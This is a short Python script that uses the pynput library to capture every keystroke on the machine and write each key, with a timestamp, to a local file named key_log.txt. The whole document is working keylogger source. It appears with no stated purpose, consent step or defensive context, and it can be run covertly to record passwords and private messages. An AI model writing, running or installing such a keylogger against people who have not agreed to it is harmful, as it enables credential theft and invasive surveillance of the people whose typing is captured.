from pynput import keyboard
import logging

# Set log file name
log_file = "key_log.txt"

# Configure the logging module
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define what to do when a key is pressed
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
